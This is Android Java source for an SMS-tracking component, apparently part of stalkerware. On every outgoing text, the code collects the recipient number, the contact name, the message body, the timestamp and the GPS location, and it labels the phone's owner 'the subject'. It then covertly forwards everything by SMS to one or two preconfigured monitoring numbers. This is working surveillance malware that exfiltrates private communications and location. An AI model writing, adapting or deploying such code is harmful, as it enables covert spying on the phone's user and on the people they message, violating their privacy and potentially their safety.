package com.it.app;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Handler;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.List;

/**
 * Created by Rusty on 8/29/14.
 */
public class SMSSentObserver extends ContentObserver {

    private static final String TAG = "SMSTRACKER";
    private static final Uri STATUS_URI = Uri.parse("content://sms");

    private Context mContext;

    LocationService loc;
    private double latitude;
    private double longitude;
    private String mess,onTracking,chkSMSsent,sentUnknown,sentSpecific,serv1Offline,serv2Offline;
    public SMSSentObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
        loc = new LocationService(ctx);
    }

    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {
        try{
        onTracking = DBAdapter.getValuesData("12");
        chkSMSsent = DBAdapter.getValuesData("8");
        sentUnknown = DBAdapter.getValuesData("9");
        sentSpecific = DBAdapter.getValuesData("10");
        serv1Offline = DBAdapter.getValuesData("3");
        serv2Offline = DBAdapter.getValuesData("4");
        if(onTracking.equals("true")&& chkSMSsent.equals("true") ){
            DBAdapter.init(mContext);
            Log.e(TAG, "Notification on SMS observer");
            Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
            if (sms_sent_cursor != null) {
                if (sms_sent_cursor.moveToFirst()) {
                    String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
                    Log.e(TAG, "protocol : " + protocol);
                    if(protocol == null){
                        //String[] colNames = sms_sent_cursor.getColumnNames();
                        int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
                        Log.e(TAG, "SMS Type : " + type);
                        if(type == 2){
                            getloc();
                            String dat = new SimpleDateFormat("MM/dd/yyyy hh:mm:ss").format(sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date")));
                            String cname= getContactName(mContext,sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
                            String longMessage1 = "&_LatLng," + latitude + "," + longitude+",sent,"+ sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"))+
                                    "," + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"))+
                                    ","+ dat;
                            String longMessage2 = "Location:"+latitude + "," + longitude+"\n\nThe subject sent an sms to " +cname +":"+sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"))+"\n\nSMS content: "+sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"))+"\n\nSMS Timestamp: "+dat;
                            String chk[]=sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")).split(",");
                            if (chk.equals("&_LatLng")){
                                //nothing to do
                                Toast.makeText(mContext, "nothing to do" , Toast.LENGTH_SHORT).show();
                            }else{
                              if(sentSpecific.equals("true")){
                                List<DBSentConData> data = DBAdapter.getAllSCData();
                                for (DBSentConData dt : data) {
                                  if(!dt.getNum().equals("empty")){
                                    String test =  dt.getNum().substring(dt.getNum().indexOf("9"));
                                    if(test.equals(sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")).substring(sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")).indexOf("9")))){
                                        if(!DBAdapter.getServerNum("1").equals("empty")){
                                            if(serv1Offline.equals("true")){mess = longMessage2;}
                                            else{mess = longMessage1;}
                                            SmsManager sms1 = SmsManager.getDefault();
                                            sms1.sendTextMessage(DBAdapter.getServerNum("1"), null, mess, null, null);}
                                        if(!DBAdapter.getServerNum("2").equals("empty")){
                                            if(serv2Offline.equals("true")){mess = longMessage2;}
                                            else{mess = longMessage1;}
                                            SmsManager sms2 = SmsManager.getDefault();
                                            sms2.sendTextMessage(DBAdapter.getServerNum("2"), null, mess, null, null);
                                        }
                                        Toast.makeText(mContext, "sent sms detected" , Toast.LENGTH_SHORT).show();
                                    }
                                  }//ifnotempty
                                }
                              }//sentspecific
                                if(sentUnknown.equals("true")){
                                   String test =  sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
                                   if(!contactExists(mContext,test)){
                                            if(!DBAdapter.getServerNum("1").equals("empty")){
                                                if(serv1Offline.equals("true")){mess = longMessage2;}
                                                else{mess = longMessage1;}
                                                SmsManager sms1 = SmsManager.getDefault();
                                                sms1.sendTextMessage(DBAdapter.getServerNum("1"), null, mess, null, null);
                                                if(serv2Offline.equals("true")){mess = longMessage2;}
                                                else{mess = longMessage1;}
                                                SmsManager sms2 = SmsManager.getDefault();
                                                sms2.sendTextMessage(DBAdapter.getServerNum("2"), null, mess, null, null);
                                            }
                                            Toast.makeText(mContext, "sent sms detected" , Toast.LENGTH_SHORT).show();
                                   }//ifExists
                                }//sentunknown
                            }
			        		/*
			        		if(colNames != null){
			        			for(int k=0; k<colNames.length; k++){
			        				Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
			        			}
			        		}
			        		*/
                        }
                    }
                }
            }//onTracking
            }
            else
                Log.e(TAG, "Send Cursor is Empty");
        }
        catch(Exception sggh){
            Log.e(TAG, "Error on onChange : "+sggh.toString());
        }
        super.onChange(selfChange);
    }//fn onChange
    private void getloc(){
       try{
        Location nwLoc = loc.getLocation(LocationManager.GPS_PROVIDER);
        if (nwLoc!=null){
            latitude = nwLoc.getLatitude();
            longitude = nwLoc.getLongitude();
        }
       }catch(Exception e){
           latitude = 0.0;
           longitude = 0.0;
       }
    }
    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri,
                new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME }, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }
    public boolean contactExists(Context context, String number) {
/// number is the phone number
        Uri lookupUri = Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(number));
        String[] mPhoneNumberProjection = { ContactsContract.PhoneLookup._ID, ContactsContract.PhoneLookup.NUMBER, ContactsContract.PhoneLookup.DISPLAY_NAME };
        Cursor cur = context.getContentResolver().query(lookupUri,mPhoneNumberProjection, null, null, null);
        try {
            if (cur.moveToFirst()) {
                return true;
            }
        } finally {
            if (cur != null)
                cur.close();
        }
        return false;
    }
}//End o
